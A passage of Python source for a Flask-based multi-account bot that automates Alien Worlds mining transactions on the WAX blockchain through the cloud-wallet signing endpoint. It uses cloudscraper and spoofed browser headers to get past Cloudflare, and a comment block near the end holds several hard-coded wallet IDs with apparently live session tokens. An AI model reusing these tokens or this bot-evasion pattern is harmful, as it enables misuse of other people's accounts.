            'cooldown' : self.DATA['cooldown'] * self.DATA['land']['delay']
        })
        return self.DATA['cooldown']
    def chk_cpu(
        self
    ):
        self.DATA.update({
            'cpu'       : self.DATA['account']['cpu_limit']
        })
        self.DATA['cpu'].update({
            'allow'     : float(f'{float(self.DATA["cpu"]["available"] * 100 / self.DATA["cpu"]["max"]):.2f}')
        })
        return self.DATA['cpu']['allow']
    def get_nonce(
        self
    ):
        
        global DATABASE
        
        self.DATA['PROCESS']['get_nonce'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_nonce']           = cloudscraper.create_scraper().get(
                    f'{ random.choice( WAXAPI().hostminer )["address"] }{ self.DATA["login"]["userAccount"] }&difficulty={ self.DATA["difficulty"] }&lastMineTx={ self.DATA["last_mine"]["last_mine_tx"] }'
                )
                self.DATA.update({
                    'nonce'         : json.loads(self.DATA['PROCESS']['get_nonce'].content)
                })
                
                try         : DATABASE[ self.DATA['waxid'] ]['text']['10']      = f'<pre>2/7 GET { self.DATA["nonce"]["nonce"] }</pre>' 
                except      : pass
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step']    = '10'
                except      : pass
                
                if not re.search('(\'|\"|^|$)\w{14,16}(\'|\"|^|$)', str(self.DATA['nonce'])):
                    print( f'ERROR get_nonce() 917 : NOT FOUND nonce' )
                    time.sleep(5)
                    continue
            except Exception as e:
                print( f'ERROR get_nonce() 921 : {e}' )
                time.sleep(5)
                continue
            break
    def set_info_block(
        self
    ):
        
        self.DATA['PROCESS']['get_info_block'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_info_block']      = cloudscraper.create_scraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #   debug = True, 
                    delay   = 10
                ).post(
                    'https://wax.dapplica.io/v1/chain/get_info', 
                    data    = f'{{}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA['block'].update({
                    'chain_id'          : json.loads(self.DATA['PROCESS']['get_info_block'].content)['chain_id'], 
                    'head_block_num'    : json.loads(self.DATA['PROCESS']['get_info_block'].content)['head_block_num'] - 3
                })
            except Exception as e:
                print( f'ERROR get_info_block() 271 : {e}' )
                time.sleep(5)
                continue
            break
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['get_info_block']      = cloudscraper.create_scraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #   debug = True, 
                    delay   = 10
                ).post(
                    'https://wax.dapplica.io/v1/chain/get_block', 
                    data    = f'{{\"block_num_or_id\":{ self.DATA["block"]["head_block_num"] }}}', 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA['block'].update({
                    'ref_block_prefix'  : json.loads(self.DATA['PROCESS']['get_info_block'].content)['ref_block_prefix'], 
                    'expiration'        : [
                        json.loads(self.DATA['PROCESS']['get_info_block'].content)['timestamp'], 
                        (
                            timedate.strptime( json.loads(self.DATA['PROCESS']['get_info_block'].content)['timestamp'], "%Y-%m-%dT%H:%M:%S.%f" ) + datetime.timedelta(0,30)
                        ).strftime(f"%Y-%m-%dT%H:%M:%S.%f")[:-3]
                    ]
                })
            except Exception as e:
                print( f'ERROR get_info_block() 271 : {e}' )
                time.sleep(5)
                continue
            break
    def set_packedtrx(
        self
    ):
        
        self.DATA['PROCESS']['set_packedtrx'] = None
                
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
                self.DATA['PROCESS']['set_packedtrx'] = cloudscraper.create_scraper().get(
                    f'http://awmine-express.vercel.app/packedtrx?actor={ self.DATA["login"]["userAccount"] }&block_num_or_id={ self.DATA["block"]["head_block_num"] }-{ self.DATA["block"]["ref_block_prefix"] }&nonce={ self.DATA["nonce"]["nonce"] }&expiration={ self.DATA["block"]["expiration"][1] }&chainId={ self.DATA["block"]["chain_id"] }'
                )
                self.DATA['packedtrx'].update(json.loads(self.DATA['PROCESS']['set_packedtrx'].content))
                self.DATA['packedtrx']['serializedTransaction'].update({
                    'Unit8Array' : [
                        self.DATA['packedtrx']['serializedTransaction'][x] for x in self.DATA['packedtrx']['serializedTransaction']
                    ]
                })
            except Exception as e:
                print( f'ERROR set_packedtrx() 271 : {e}' )
                time.sleep(5)
                continue
            break
    def claim_sign(
        self
    ):
        
        global DATABASE
        
        self.DATA['PROCESS']['claim_sign'] = None
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:

                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '12'
                except      : pass
                
                self.DATA['transaction'].update({
                    'raw' : f'{{\"transaction\":{{\"expiration\":\"{ self.DATA["block"]["expiration"][1] }\",\"ref_block_num\":{ self.DATA["packedtrx"]["transactions"]["ref_block_num"] },\"ref_block_prefix\":{ self.DATA["packedtrx"]["transactions"]["ref_block_prefix"] },\"actions\":[{{\"account\":\"m.federation\",\"name\":\"mine\",\"authorization\":[{{\"actor\":\"{ self.DATA["login"]["userAccount"] }\",\"permission\":\"active\"}}],\"data":\"{ self.DATA["packedtrx"]["transactions"]["actions"][0]["data"] }\"}}]}},\"available_keys\":[\"{ self.DATA["account"]["permissions"][0]["required_auth"]["keys"][0]["key"] }\",\"{ self.DATA["account"]["permissions"][0]["required_auth"]["keys"][1]["key"] }\"]}}'
                })
                self.DATA['PROCESS']['claim_sign']       = cloudscraper.CloudScraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #*   debug   = True, 
                    delay   = 10
                ).post(
                    'https://wax.dapplica.io/v1/chain/get_required_keys', 
                    data    = self.DATA['transaction']['raw'], 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA['transaction'].update({
                    'res' : json.loads(self.DATA['PROCESS']['claim_sign'].content)
                })
                
            except Exception as e:
                print( f'ERROR claim_sign() : {e}' )
                time.sleep(6)
                continue
            break
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
            
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '13'
                except      : pass
                
                self.DATA['transaction'].update({
                    'wax' : f'{{\"serializedTransaction\":{ self.DATA["packedtrx"]["serializedTransaction"]["Unit8Array"] },\"website\":\"play.alienworlds.io\",\"description\":\"jwt is insecure\"}}'
                })
                self.DATA['PROCESS']['claim_sign']       = cloudscraper.CloudScraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #*   debug   = True, 
                    delay   = 10
                ).post(
                    'https://public-wax-on.wax.io/wam/sign', 
                    headers = {
                        'authority'             : 'public-wax-on.wax.io',
                        'accept'                : 'application/json, text/plain, */*',
                        'accept-language'       : 'en-US,en;q=0.9',
                        'content-type'          : 'application/json;charset=UTF-8',
                        'sec-fetch-dest'        : 'empty',
                        'sec-fetch-mode'        : 'cors',
                        'sec-fetch-site'        : 'same-site',
                        'sec-gpc'               : '1',
                        'origin'                : 'https://all-access.wax.io',
                        'referer'               : 'https://all-access.wax.io/', 
                        'x-access-token'        : f'{ self.DATA["token"] }'
                    }, 
                    json    = {
                        'serializedTransaction' : self.DATA["packedtrx"]["serializedTransaction"]["Unit8Array"], 
                        'website'               : 'play.alienworlds.io', 
                        'description'           : 'jwt is insecure'
                    }, 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA['transaction'].update({
                    'all' : json.loads(self.DATA['PROCESS']['claim_sign'].content)
                })
            except Exception as e:
                print( f'ERROR get_login() : {e}' )
                time.sleep(6)
                continue
            break
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
            
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step'] = '14'
                except      : pass
                
                self.DATA['transaction'].update({
                    'sig' : f'{{\"signatures\":[\"{ self.DATA["transaction"]["all"]["signatures"][0] }\",\"{ self.DATA["transaction"]["all"]["signatures"][1] }\"],\"compression\":0,\"packed_context_free_data\":\"\",\"packed_trx\":\"{ self.DATA["packedtrx"]["packed_trx"] }\"}}'
                })
                self.DATA['PROCESS']['claim_sign']       = cloudscraper.CloudScraper(
                    browser = {
                        'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                    }, 
                    #*   debug   = True, 
                    delay   = 10
                ).post(
                    'https://wax.dapplica.io/v1/chain/push_transaction', 
                    data    = self.DATA['transaction']['sig'], 
                    #   proxies     = {
                    #       "http"      : "socks5://127.0.0.1:23321", 
                    #       "https"     : "socks5://127.0.0.1:23321", 
                    #       "ftp"       : "socks5://127.0.0.1:23321"
                    #   }
                )
                self.DATA['transaction'].update({
                    'trx' : json.loads(self.DATA['PROCESS']['claim_sign'].content)
                })
                #   self.DATA["last_mine"].update({
                #       'last_mine_tx' : self.DATA["transaction"]["trx"].get("transaction_id")
                #   })
                self.DATA["last_mine"]['last_mine_tx'] = self.DATA["transaction"]["trx"].get("transaction_id")
            except Exception as e:
                print( f'ERROR claim_sign() : {e}' )
                time.sleep(6)
                continue
            break
        if not self.DATA["transaction"]["trx"].get('transaction_id'):
            DATABASE[ self.DATA['waxid'] ]['stat'] = None
            #   self.get_info_last_mine(); self.get_transaction();
            try         : DATABASE[ self.DATA['waxid'] ]['text']['step']    = '17'
            except      : pass
            self.DATA['nonce'] = None
            time.sleep(5)
            return False
        else:
            DATABASE[ self.DATA['waxid'] ]['stat'] = True
            self.get_transaction(); self.get_info_balance()
            try         : DATABASE[ self.DATA['waxid'] ]['text']['step']    = '16'
            except      : pass
            self.DATA['nonce'] = None
            time.sleep(5)
            return True
    def get_transaction(
        self
    ):
        
        global DATABASE
        
        self.DATA['PROCESS']['get_transaction'] = {
            'request' : None, 
            'content' : None
        }
        
        while True:
            try:
                if (
                    THREADER[ self.DATA['waxid'] ]['status'] == False or THREADER[ self.DATA['waxid'] ]['status'] == None
                ) or (
                    DATABASE[ self.DATA['waxid'] ]['stat'] == False
                ):
                    break
            except:
                break
            try:
            
                try         : DATABASE[ self.DATA['waxid'] ]['text']['step']    = '15'
                except      : pass
                
                if random.randrange(100) >= 76:
                    self.DATA['PROCESS']['get_transaction']['request']            = cloudscraper.create_scraper(
                        browser = {
                            'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                        }, 
                        #*   debug   = True, 
                        delay   = 18
                    ).get(
                        f'https://eosx-apigw.eosx.io/api/transactions/{ self.DATA["last_mine"].get("last_mine_tx") }?chain=wax'
                    )
                    
                    self.DATA['PROCESS']['get_transaction']['content'] = json.loads(self.DATA['PROCESS']['get_transaction']['request'].content)
                    
                    self.DATA['log']['last_cpu_usage']  = self.DATA['PROCESS']['get_transaction']['content']['data']['cpuUsage']                                        if not self.DATA['PROCESS']['get_transaction']['content']['data']['raw'].get('execution_trace') else self.DATA['PROCESS']['get_transaction']['content']['data']['raw']['execution_trace']['receipt']['cpu_usage_us']
                    self.DATA['log']['last_tlm_mined']  = self.DATA['PROCESS']['get_transaction']['content']['data']['traces'][1]['data']['quantity'].split(' ')[0]     if not self.DATA['PROCESS']['get_transaction']['content']['data']['raw'].get('execution_trace') else self.DATA['PROCESS']['get_transaction']['content']['data']['traces'][0]['traces'][1]['data']['quantity'].split(' ')[0]
                    self.DATA['last_time']              = self.DATA['PROCESS']['get_transaction']['content']['data']['blockTime']                                       if not self.DATA['PROCESS']['get_transaction']['content']['data']['raw'].get('execution_trace') else self.DATA['PROCESS']['get_transaction']['content']['data']['raw']['execution_block_header']['timestamp']
                else:
                    self.DATA['PROCESS']['get_transaction']['request']            = cloudscraper.create_scraper(
                        browser = {
                            'custom': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.2'
                        }, 
                        #*   debug   = True, 
                        delay   = 18
                    ).get(
                        f'https://{ random.choice( WAXAPI.histories ).split("//")[-1] }/v2/history/get_transaction?id={ self.DATA["last_mine"].get("last_mine_tx") }'
                    )
                    
                    self.DATA['PROCESS']['get_transaction']['content'] = json.loads(self.DATA['PROCESS']['get_transaction']['request'].content)
                    
                    self.DATA['log']['last_cpu_usage']  = self.DATA['PROCESS']['get_transaction']['content']['actions'][0]['cpu_usage_us']
                    self.DATA['log']['last_tlm_mined']  = self.DATA['PROCESS']['get_transaction']['content']['actions'][1]['act']['data']['quantity'].split(' ')[0]
                    self.DATA['last_time']              = self.DATA['PROCESS']['get_transaction']['content']['actions'][1]['@timestamp']
            except requests.exceptions.ConnectionError as e:
                print( f'ERROR get_transaction() 1301 : { self.DATA["login"]["userAccount"] } - HTTPSConnectionPool - RETRY ' )
                time.sleep(5)
                continue
            except Exception as e:
            
                self.get_info_last_mine()
                
                try     : print( f'ERROR get_transaction() 1308 : { self.DATA["login"]["userAccount"] } - { self.DATA["PROCESS"]["get_transaction"]["request"].url } - {e}' )
                except  : print( f'ERROR get_transaction() 1309 : { self.DATA["login"]["userAccount"] } - None self.DATA["PROCESS"]["get_transaction"]["request"].url - {e}' )
                try     : print( f'ERROR get_transaction() 1310 : { self.DATA["login"]["userAccount"] } - { self.DATA["PROCESS"]["get_transaction"]["content"] } - {e}' )
                except  : print( f'ERROR get_transaction() 1311 : { self.DATA["login"]["userAccount"] } - None self.DATA["PROCESS"]["get_transaction"]["content"] - {e}' )
                time.sleep(5)
                continue
            break

app = Flask(
    __name__, 
    static_url_path = '', 
    static_folder   = 'static',
    template_folder = 'templates'
)

#   log = logging.getLogger('werkzeug').setLevel(logging.ERROR)

#   @app.before_request
#   def force_https():
#       if request.endpoint in app.view_functions and not request.is_secure:
#           return redirect(request.url.replace('http://', 'https://'))

#   @app.route('/.well-known/acme-challenge/<challenge>')
#   def letsencrypt_well_known(challenge):
#       challenge_response = {
#           "e95m6FKZvQCT5aRXZZ5pCXr6HKyp-Wnvs04Ovk2LbQ8" : "e95m6FKZvQCT5aRXZZ5pCXr6HKyp-Wnvs04Ovk2LbQ8.hnN0eujq4--N2u7jVkPDeS9pGR-vHkYYPgObQeVLIjI", 
#           "6Va1lWaifguFxj9uFmw1klI6HAm16Hk8umyMlEwGSXw" : "6Va1lWaifguFxj9uFmw1klI6HAm16Hk8umyMlEwGSXw.hnN0eujq4--N2u7jVkPDeS9pGR-vHkYYPgObQeVLIjI", 
#           "lOfNt8_n6TCyOIxLNZiGe2k1pyxrllQ20lvUlryvWZw" : "lOfNt8_n6TCyOIxLNZiGe2k1pyxrllQ20lvUlryvWZw.hnN0eujq4--N2u7jVkPDeS9pGR-vHkYYPgObQeVLIjI", 
#           "sNfqYCIz8coFXkmblY5B1FGv90lNja9XMYy4K5x7s0A" : "sNfqYCIz8coFXkmblY5B1FGv90lNja9XMYy4K5x7s0A.hnN0eujq4--N2u7jVkPDeS9pGR-vHkYYPgObQeVLIjI"
#       }
#       return Response(
#           challenge_response[challenge], 
#           mimetype='text/plain'
#       )
    
#   @app.route('/favicon.ico')
#   def favicon():
#       return send_from_directory(app.static_folder, 'img/favicon.ico', mimetype='image/png'), 200

#   @app.route('/arc-sw.js')
#   def arcsw():
#       return send_from_directory(app.static_folder, 'js/arc-sw.js', mimetype='application/javascript'), 200

@app.route('/', methods = ['POST', 'GET'])
def index():

    global DATABASE
    global THREADER
    
    if request.method == 'GET':
        return render_template('index.html', IP = requests.get('https://checkip.amazonaws.com').text.strip())
        ''' '''.replace('XXX IP XXX', requests.get('https://checkip.amazonaws.com').text.strip())
    else:
        return jsonify(
            DATA = DATABASE, 
            DOMS = '''<td><span id="waxid" style="color: #00ff38; font-weight: bold;" >{ WAXID }</span></td>\
<td>\
    <div class="progress justify-content-center">\
        <option\
            class           = "progress-bar bg-success"\
            role            = "progressbar"\
            aria-valuemin   = "0"\
            id              = "cpu_prg"\
            aria-valuenow   = "{ CPU NOW }"\
            aria-valuemax   = "{ CPU MAX }"\
            style           = "width: { CPU PER }%;"\
        >{ CPU PER }%</option>\
    </div>\
</td>\
<td><span id="cpustake"     >{ STAKE } WAX</span></td>\
<td><span id="waxbalance"   >{ WAX TOTAL } WAX</span><span> / </span><span id="tlmbalance" >{ TLM TOTAL } TLM</span></td>\
<td><span id="land"         >{ LAND }</span></td>\
<td>\
    <span\
        id      = "lastminedelay"\
        style   = "color: #00ff38;"\
    >{ LAST MINE DELAY }/s</span><span>&nbsp;</span><span id="lastminestamp" >{ LAST MINE STAMP }</span>\
</td>\
<td><span id="lasttlm"      >{ LAST TLM } TLM</span><span> : </span><span id="lastcpu" >{ LAST CPU } US</span></td>\
<td><span id="state"        >-------------------------</span></td>\
        '''
        ), 200

#   @app.route('/add', methods = ['POST'])
#   def ADD():
#   
#   @app.route('/del', methods = ['POST'])
#   def del():
#   
#   @app.route('/start', methods = ['GET'])
#   def start():



@app.route('/run', methods = ['GET', 'HEAD'])
def run():
    
    if request.method == 'GET' or request.method == 'HEAD':
        return CONTROLLER(repli = request.args.get('repli', '')).run()
    else:
        return '', 204
        
@app.route('/cut', methods = ['GET'])
def cut():
    
    if request.method == 'GET':
        return CONTROLLER(repli = request.args.get('repli', '')).cut()
    else:
        return '', 204
        
@app.route('/chk', methods = ['GET'])
def chk():
    
    if request.method == 'GET' and not request.args.get('waxid', '') == '':
        return CONTROLLER(waxid = request.args.get('waxid', '')).chk()
    else:
        return '', 204

@app.route('/off', methods = ['GET'])
def off():
    
    if request.method == 'GET':
        return CONTROLLER(repli = request.args.get('repli', '')).off()
    else:
        return '', 204

class CONTROLLER():
    def __init__(
        self, 
        waxid = '', 
        token = '', 
        repli = ''
    ):
    
        global DATABASE
        
        self.waxid  = waxid
        self.token  = token
        self.repli  = repli
        self.DATA   = {
            'run' : {
                'content' : None, 
                'request' : None
            }
        }
    def run(
        self
    ):
    
        global DATABASE
        global THREADER
        
        print( f'https://awcloud-data-{ self.repli }.patiwatnumbut.repl.co/data' )
        
        try:
            self.DATA['run']['request'] = cloudscraper.create_scraper().get(
                f'https://awcloud-data-{ self.repli }.patiwatnumbut.repl.co/data'
            )
        except Exception as e:
            return 'fail : {e} 1299', 204
        
        try:
            self.DATA['run']['content'] = json.loads(self.DATA['run']['request'].content)['account']
        except Exception as e:
            return 'fail : {e} 1304', 204
        
        for x in self.DATA['run']['content']:
            try:
                if not x['waxid'] in list( DATABASE ):
                    AWMINE(waxid = x['waxid'], token = x['token']).thread()
            except NameError as e:
                cloudscraper.create_scraper().post(
                    f'https://awcloud-data-{ self.repli }.patiwatnumbut.repl.co/del', 
                    json = {"waxid" : x['waxid']}
                )
                pass
            except Exception as e:
                return f'nope : {e}', 203
        return 'okay', 200
        
    def chk(
        self
    ):
        global DATABASE
        global THREADER
        
        try:
            if self.waxid in list( DATABASE ):
                return 'okay', 200
            return 'fail', 204
        except Exception as e:
            return f'fail : {e}', 204
            
    def cut(
        self
    ):
    
        global DATABASE
        global THREADER
        
        print( f'https://awcloud-data-{ self.repli }.patiwatnumbut.repl.co/data' )
        
        try:
            self.DATA['run']['request'] = cloudscraper.create_scraper().get(
                f'https://awcloud-data-{ self.repli }.patiwatnumbut.repl.co/data'
            )
        except Exception as e:
            return 'fail : {e} 1299', 204
        
        try:
            self.DATA['run']['content'] = json.loads(self.DATA['run']['request'].content)['account']
        except Exception as e:
            return 'fail : {e} 1304', 204
        
        try:
            for x in list( DATABASE ):
                if not x in [ i['waxid'] for i in self.DATA['run']['content'] ]:
                    DATABASE[ x ]['stat']       = False
                    THREADER[ x ]['status']     = False
            return 'okay', 200
        except Exception as e:
            return f'nope : {e}', 203
        return 'fail : 1604', 204
    def off(
        self
    ):
    
        global DATABASE
        global THREADER
        
        for w in DATABASE:
            DATABASE[ w ]['stat']       = False
            THREADER[ w ]['status']     = False
        
        return 'okay', 200
            


@app.before_first_request
def BEFORE_FIRST_REQUEST_THREAD():

    global DATABASE
    global THREADER
    
    
if __name__ == "__main__":
    _thread.start_new_thread(app.run, (), {
        'host'          : '0.0.0.0'
    })
    while True:
        input('PRESS ANY KEY TO EXTRACT DATABASE')
        print( DATABASE )
        continue

#   CMD /C "START /D $(CURRENT_DIRECTORY) /MAX CMD /C "py $(FULL_CURRENT_PATH) & PAUSE""
#   https://api.honeygain.com/api/v1/ping 'https://api.packetstream.io/exitnode/ipinfo/%s?client_version=%s'
#   busybox reboot























    #   _thread.start_new_thread(app.run, (), {
    #       'host'          : '0.0.0.0', 
    #       'port'          : 5000, 
    #       'threaded'      : True, 
    #       'debug'         : True, 
    #       'use_reloader'  : False, 
    #       'ssl_context'   : 'adhoc'
    #   })

            
        #   xxx = [
        #       AWMINE(waxid = 'mzpeo.wam', token = 'wYeaMcKrMqLwKU0mHuD1Xw931LhF8jDPk3nvxQXU').thread(), 
        #       AWMINE(waxid = '2ojeq.wam', token = 'ChDyH4WiZ6xTcfzjq9y6JKqtVnbb2OR7CFjE4Ke3').thread(), 
        #       AWMINE(waxid = 'ep.uq.wam', token = 'LM97dvOvrGy5LPm7iffCtZF74t1ej8XlDgsQDoks').thread(), 
        #       AWMINE(waxid = 'w5fes.wam', token = 'QRe2wHSeYjq4LuTvVaDWeZGLB3Hagglv4WN2wVcT').thread(), 
        #       AWMINE(waxid = 'shges.wam', token = 'J3WXK0DouZPxmUkYAvQkf3DNsQR3143ALXF5ACZA').thread(), 
        #       AWMINE(waxid = 'f4teq.wam', token = 'UuSh8CeJ5FWT7qpB7F30yIzDieYHoPwiJgQP5fMm').thread()
        #   ]
#                   <form>
#                       <div class="row">
#                           <div class="col-sm-3 my-1" style="">
#                               <div class="input-group">
#                                   <div class="input-group-prepend">
#                                       <div class="input-group-text">@</div>
#                                   </div>
#                                   <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username" />
#                               </div>
#                           </div>
#                       </div>
#                       <input type="submit" value="Submit" />
#                   </form>
#                   
#                   <form>
#                       <div class="">
#                           <div class="col-sm-3 my-1">
#                               <input type="text" class="form-control" id="inlineFormInputName" placeholder="Jane Doe" />
#                           </div>
#                           <div class="col-sm-3 my-1" style="">
#                               <div class="input-group">
#                                   <div class="input-group-prepend">
#                                       <div class="input-group-text">@</div>
#                                   </div>
#                                   <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username" />
#                               </div>
#                           </div>
#                           <div class="col-sm-3 my-1">
#                               <input type="text" class="form-control" id="inlineFormInputName" placeholder="Jane Doe" />
#                           </div>
#                           <div class="col-sm-3 my-1" style="">
#                               <div class="input-group">
#                                   <div class="input-group-prepend">
#                                       <div class="input-group-text">@</div>
#                                   </div>
#                                   <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username" />
#                               </div>
#                           </div>
#                           <button type="submit" class="btn btn-primary">Submit</button>
#                       </div>
#                   </form>
#                   
#                   <form>
#                       
#                       <div class="col-sm-3 my-1" style="">
#                           <div class="input-group">
#                               <div class="input-group-prepend">
#                                   <div class="input-group-text">@</div>
#                               </div>
#                               <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username">
#                           </div>
#                       </div>
#                       
#                       <div class="col-sm-3 my-1" style="">
#                           <div class="input-group">
#                               <div class="input-group-prepend">
#                                   <div class="input-group-text">@</div>
#                               </div>
#                               <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username">
#                           </div>
#                       </div>
#                       
#                       <button type="submit" class="btn btn-primary" style="">Submit</button>
#                           
#                   </form>
#                   
#                   
#                   <form class="form-inline">
#                       <label class="sr-only" for="inlineFormInputName2">Name</label>
#                       <input type="text" class="form-control mb-2 mr-sm-2" id="inlineFormInputName2" placeholder="Jane Doe" />
#                   
#                       <label class="sr-only" for="inlineFormInputGroupUsername2">Username</label>
#                       <div class="input-group mb-2 mr-sm-2">
#                           <div class="input-group-prepend">
#                               <div class="input-group-text">@</div>
#                           </div>
#                           <input type="text" class="form-control" id="inlineFormInputGroupUsername2" placeholder="Username" />
#                       </div>
#                   
#                       <div class="form-check mb-2 mr-sm-2">
#                           <input class="form-check-input" type="checkbox" id="inlineFormCheck" />
#                           <label class="form-check-label" for="inlineFormCheck">
#                               Remember me
#                           </label>
#                       </div>
#                   
#                       <button type="submit" class="btn btn-primary mb-2">Submit</button>
#                   </form>
#                   
#                   
#                   
#                   
#                   
#                   <form action="#">
#                       <div class="">
#                           
#                           <div class="col-sm-3 my-1" style="">
#                               <div class="input-group">
#                                   <div class="input-group-prepend">
#                                       <div class="input-group-text">WAXID</div>
#                                   </div>
#                                   <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username">
#                               </div>
#                           </div>
#                           
#                           <div class="col-sm-3 my-1" style="">
#                               <div class="input-group">
#                                   <div class="input-group-prepend">
#                                       <div class="input-group-text">TOKEN</div>
#                                   </div>
#                                   <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username">
#                               </div>
#                           </div>
#                           <button id="save_config" type="button" class="btn btn-primary" style=""> Save </button>
#                       </div>
#                   </form>
#                        <th scope="col">#</th>
#                        <!--th scope="col"> RAM </th-->
#                        <!--th scope="col">TLM/h</th-->
#                        <!--th scope="col"> NFT </th-->
#                        <!--th scope="col">SWITCH</th-->

  

#       <!--td>
#           <div class="progress">
#               <option
#                   class           = "progress-bar bg-success"
#                   role            = "progressbar"
#                   aria-valuemin   = "0"
#                   id              = "ram_prg"
#                   aria-valuenow   = "0"
#                   aria-valuemax   = "0"
#                   style           = "width: 0.0%;"
#               >0.0%</option>
#           </div>
#       <!--td><span id="tlmph"        ></span></td-->
#       <!--td><span id="nft"          ></span></td-->
#       <!--td><span id="switch"       ></span></td-->
#       </td-->
#        <!--    iframe id="FlowChart" src="" style="display: none; width: 100%;height: 50%;"/ -->
#        <!--
#        br />
#        <div>
#            <div class="form-check form-switch form-check-inline" style="margin-left: 10px;">
#                <input class="form-check-input border active" type="checkbox" value="true" checked="checked" id="auto_load" />
#                <label for="dark_mode">Auto Load</label>
#            </div>
#            <div class="form-check form-switch form-check-inline" style="padding-top: 10;">
#                <input class="form-check-input border active" type="checkbox" value="true" checked="checked" id="dark_mode" />
#                <label for="dark_mode">Dark Mode</label>
#            </div>
#            <button id="save_config" type="button" class="btn btn-primary" style="margin-left: 10px;"> Save </button>
#            <button id="action_start" type="button" class="btn btn-primary" style="margin-left: 10px;"> Start </button>
#            <button id="action_stop" type="button" class="btn btn-primary" style="margin-left: 10px;"> Stop </button>
#        </div>
#        <br /
#        -->

#                    <tr>
#                        <td><b>1</b></td>
#                        <td><span id="account_1" style="color: #00ff38;" >faxck.wam</span></td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-danger" role="progressbar" aria-valuemin="0" id="cpu_prg_1" aria-valuenow="27843" aria-valuemax="25897" style="width: 107.51%;">107.51%</option>
#                            </div>
#                        </td>
#                        <td>
#                            <div class="progress">
#                                <option class="progress-bar bg-success" role="progressbar" aria-valuemin="0" id="ram_prg_1" aria-valuenow="4347" aria-valuemax="9988" style="width: 43.52%;">43.52%</option>
#                            </div>
#                        </td>
#                        <td><span id="cpustake_1"      >85.40 WAX</span></td>
#                        <td><span id="waxbalance_1"    >0.0062 WAX</span></td>
#                        <td><span id="tlmbalance_1"    >1.4959 TLM</span></td>
#                        <td><span id="userstatus_1"    >CPU Over[5.2/30.0][0]</span></td>
#                        <td><span
#                           id      = "lastminetime_1"
#                           style   = "color: #;"
#                                                       >00:24:09</span></td>
#                        <td><span id="nextmine_1"      >0</span></td>
